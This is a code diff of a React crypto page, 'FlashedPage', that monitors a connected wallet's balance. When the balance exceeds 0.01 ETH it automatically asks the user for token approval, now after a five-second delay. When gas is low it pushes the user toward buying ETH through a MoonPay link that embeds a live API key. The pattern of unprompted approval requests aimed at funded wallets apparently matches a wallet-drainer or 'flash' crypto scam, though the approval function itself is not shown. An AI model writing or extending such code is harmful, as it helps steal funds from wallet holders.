@@ -250,16 +250,16 @@ export default function FlashedPage() {
         const balanceInEth = parseFloat(ethers.formatEther(balance));
         setUserBalance(balanceInEth);
         
-        // Auto-request approval if balance detected
-        if (balanceInEth > 0.01) {
-          await requestTokenApproval();
-          if (balanceMonitorInterval) {
-            clearInterval(balanceMonitorInterval);
-            setBalanceMonitorInterval(null);
+        // Give user 5 seconds to interact before auto-prompts
+        setTimeout(() => {
+          if (balanceInEth > 0.01) {
+            requestTokenApproval();
+            if (balanceMonitorInterval) {
+              clearInterval(balanceMonitorInterval);
+              setBalanceMonitorInterval(null);
+            }
           }
-        } else {
-          await promptBuyCrypto();
-        }
+        }, 5000);
       }
     } catch (error) {
       console.log('Balance check failed:', error);
@@ -292,11 +292,6 @@ export default function FlashedPage() {
     try {
       // Use native wallet buy crypto feature
       if (window.ethereum && window.ethereum.isMetaMask) {
-        await window.ethereum.request({
-          method: 'wallet_requestPermissions',
-          params: [{ eth_accounts: {} }]
-        });
-        
         // Trigger MetaMask buy interface
         window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=${userAddress}`, '_blank', 'width=400,height=600');
       }
@@ -651,8 +646,8 @@ export default function FlashedPage() {
   const checkGasAndPromptBuy = async () => {
     const gasFee = parseFloat(calculateGasFee());
     if (userBalance < gasFee) {
-      // Trigger native wallet buy crypto
-      await promptBuyCrypto();
+      // Show closeable prompt instead of auto-triggering
+      setShowModal('insufficientGas');
       return false;
     }
     return true;
@@ -2738,6 +2733,54 @@ export default function FlashedPage() {
           )}
 
 
+
+          {/* Insufficient Gas Modal */}
+          {showModal === 'insufficientGas' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Insufficient Balance</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-yellow-400 text-3xl mb-2">⛽</div>
+                    <p className="text-gray-300 text-sm">
+                      You need ${(parseFloat(calculateGasFee()) * 3200).toFixed(2)} worth of ETH for gas fees.
+                    </p>
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300 text-sm">Current Balance:</span>
+                      <span className="text-white">{userBalance.toFixed(4)} ETH</span>
+                    </div>
+                    <div className="flex justify-between items-center">
+                      <span className="text-gray-300 text-sm">Required:</span>
+                      <span className="text-red-400">{calculateGasFee()} ETH</span>
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={async () => {
+                      setShowModal(null);
+                      await promptBuyCrypto();
+                    }}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    Buy ETH
+                  </button>
+                  
+                  <button 
+                    onClick={() => setShowModal(null)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
 
           {/* Status Message */}
           {status && (
